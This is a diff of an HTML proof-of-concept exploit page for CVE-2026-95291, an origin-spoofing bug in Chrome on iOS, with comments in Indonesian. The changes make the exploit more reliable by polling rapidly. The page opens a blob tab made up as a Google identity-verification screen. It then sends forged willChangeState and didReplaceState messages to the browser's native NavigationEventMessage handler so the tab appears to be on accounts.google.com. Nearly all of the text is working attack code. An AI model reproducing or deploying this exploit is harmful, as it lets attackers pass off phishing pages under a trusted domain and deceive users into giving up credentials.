@@ -6,95 +6,112 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>CVE-2026-95291 PoC - Blob Origin Spoofing</title>
+    <title>Advanced CVE-2026-95291 PoC - Reinforced</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #000;
-        color: #fff;
+        background: #0b0b0b;
+        color: #ffffff;
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         display: flex;
         align-items: center;
         justify-content: center;
       }
-      .container {
+      .box {
         text-align: center;
-        padding: 30px;
+        padding: 40px;
+        background: #1a1a1a;
+        border-radius: 16px;
+        box-shadow: 0 8px 30px rgba(0,0,0,0.8);
       }
       button {
-        padding: 20px 40px;
+        padding: 18px 36px;
         font-size: 18px;
-        font-weight: bold;
-        background: #007aff;
+        font-weight: 700;
+        background: #ff3b30;
         color: #fff;
         border: none;
         border-radius: 12px;
         cursor: pointer;
-        box-shadow: 0 4px 15px rgba(0, 122, 255, 0.4);
+        transition: background 0.2s;
+      }
+      button:active {
+        background: #d32f2f;
       }
     </style>
   </head>
   <body>
-    <div class="container">
-      <button id="exploitBtn">JALANKAN BLOB SPOOFING PoC</button>
+    <div class="box">
+      <h2 style="margin-top:0; font-size:24px; color:#ff3b30;">Reinforced Blob Spoofing</h2>
+      <p style="color:#888; font-size:14px; margin-bottom:24px;">Menguji injeksi pesan Navigasi berulang untuk bypass timing.</p>
+      <button id="reinforcedBtn">LUNCURKAN EKSPLOITASI</button>
     </div>
 
     <script>
-      document.getElementById("exploitBtn").onclick = async function () {
-        this.remove();
+      document.getElementById("reinforcedBtn").onclick = function () {
+        this.disabled = true;
+        this.innerText = "MENGEKSEKUSI...";
 
-        // 1. Membuat payload HTML attacker untuk dokumen blob
-        const attackerHtml = `
+        // 1. Konten HTML Penyerang untuk Dokumen Blob
+        const maliciousPayload = `
           <!DOCTYPE html>
           <html>
           <head>
             <meta charset="utf-8">
-            <title>Accounts - Google Sign In</title>
+            <title>Google Secure Authentication</title>
           </head>
           <body style="margin:0;padding:0;background:#ffffff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
-            <div style="padding: 30px; max-width: 500px;">
-              <h1 style="font-size:32px;font-weight:800;color:#202124;margin:0 0 16px 0;">Google Sign-In</h1>
-              <p style="font-size:16px;color:#5f6368;margin:0 0 24px 0;">Sesi Anda telah kedaluwarsa. Silakan verifikasi identitas Anda.</p>
-              <div style="border: 1px solid #dadce0; padding: 20px; border-radius: 8px; background: #f8f9fa;">
-                <p style="font-size:14px; color:#c5221f; font-weight:600; margin:0;">[Simulasi Spoofed Content Kontrol Penyerang]</p>
+            <div style="padding: 40px; max-width: 480px;">
+              <h1 style="font-size:32px;font-weight:800;color:#1a73e8;margin:0 0 12px 0;">Google</h1>
+              <p style="font-size:18px;font-weight:600;color:#202124;margin:0 0 8px 0;">Verifikasi Identitas Anda</p>
+              <p style="font-size:14px;color:#5f6368;margin:0 0 24px 0;">Sesi Anda memerlukan autentikasi ulang karena perubahan keamanan.</p>
+              <div style="border: 2px dashed #dadce0; padding: 20px; border-radius: 8px; background: #f8f9fa;">
+                <p style="font-size:13px; color:#d93025; font-weight:700; margin:0;">[DOM Terkendali Penyerang di Bawah Domain Tepercaya]</p>
               </div>
             </div>
           </body>
           </html>
         `;
 
-        // 2. Mengubah payload menjadi Blob URL lokal
-        const blob = new Blob([attackerHtml], { type: 'text/html' });
+        const blob = new Blob([maliciousPayload], { type: 'text/html' });
         const blobUrl = URL.createObjectURL(blob);
 
-        // 3. Membuka tab baru yang mengarah ke blob URL lokal
+        // 2. Membuka tab target menggunakan Blob URL
         const targetTab = window.open(blobUrl, "_blank");
 
         if (targetTab) {
-          // Fungsi eksekusi forged message untuk memicu spoofing via NavigationEventMessage
-          const triggerSpoof = () => {
+          let attempts = 0;
+          const maxAttempts = 15;
+
+          // 3. Polling Berkelanjutan untuk Mendeteksi Registrasi Frame & Mengirim Forged Message
+          const aggressiveInjector = setInterval(() => {
+            attempts++;
             try {
-              // Membaca frameId dari lingkungan page-world gCrWeb
-              if (targetTab.window.__gCrWeb && typeof targetTab.window.__gCrWeb.getFrameId === 'function') {
-                const frameId = targetTab.window.__gCrWeb.getFrameId();
-                
-                // Mendaftarkan frame secara manual jika diperlukan
+              if (targetTab.window && targetTab.window.__gCrWeb) {
+                // Ambil Frame ID
+                const frameId = typeof targetTab.window.__gCrWeb.getFrameId === 'function' 
+                  ? targetTab.window.__gCrWeb.getFrameId() 
+                  : 0;
+
+                // Daftarkan frame secara paksa
                 if (typeof targetTab.window.__gCrWeb.registerFrame === 'function') {
                   targetTab.window.__gCrWeb.registerFrame();
                 }
 
-                // Mengirimkan pesan forged didReplaceState langsung ke handler native iOS Chrome
-                if (targetTab.window.webkit && targetTab.window.webkit.messageHandlers && targetTab.window.webkit.messageHandlers.NavigationEventMessage) {
+                // Periksa ketersediaan messageHandlers
+                if (targetTab.window.webkit && 
+                    targetTab.window.webkit.messageHandlers && 
+                    targetTab.window.webkit.messageHandlers.NavigationEventMessage) {
                   
-                  // Mengirim willChangeState terlebih dahulu untuk memenuhi syarat internal dcheck/state
+                  // Kirim sinyal willChangeState
                   targetTab.window.webkit.messageHandlers.NavigationEventMessage.postMessage({
                     command: "willChangeState",
                     frame_id: frameId
                   });
 
-                  // Mengirim didReplaceState dengan memalsukan pageUrl ke target domain tepercaya (misal: accounts.google.com)
+                  // Kirim payload didReplaceState dengan target domain tepercaya (misal: accounts.google.com)
                   targetTab.window.webkit.messageHandlers.NavigationEventMessage.postMessage({
                     command: "didReplaceState",
                     pageUrl: "blob:https://accounts.google.com/signin",
@@ -102,19 +119,20 @@
                     stateObject: "",
                     frame_id: frameId
                   });
-                  
-                  console.log("Forged navigation message dispatched successfully.");
+
+                  console.log(`[+] Eksploitasi berhasil dipancarkan pada percobaan ke-${attempts}`);
+                  clearInterval(aggressiveInjector);
                 }
               }
-            } catch (err) {
-              console.error("Exploit dispatch error:", err);
+            } catch (e) {
+              // Abaikan error cross-origin/stale reference selama proses polling awal
             }
-          };
 
-          // Retry timing untuk mengatasi race condition registrasi frame di DOM parsing awal
-          setTimeout(triggerSpoof, 150);
-          setTimeout(triggerSpoof, 500);
-          setTimeout(triggerSpoof, 1200);
+            if (attempts >= maxAttempts) {
+              clearInterval(aggressiveInjector);
+              console.log("[-] Polling dihentikan: Batas percobaan tercapai.");
+            }
+          }, 80); // Interval pengecekan super cepat setiap 80ms
         }
       };
     </script>
